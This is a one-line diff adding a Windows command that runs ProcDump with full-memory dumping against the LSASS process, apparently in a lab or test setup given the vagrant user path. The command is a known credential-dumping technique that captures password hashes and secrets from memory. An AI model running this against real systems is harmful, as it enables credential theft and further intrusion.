@@ -1,0 +1,1 @@
+C:\Users\vagrant\Desktop\Procdump\procdump.exe -accepteula -ma lsass.exe hash
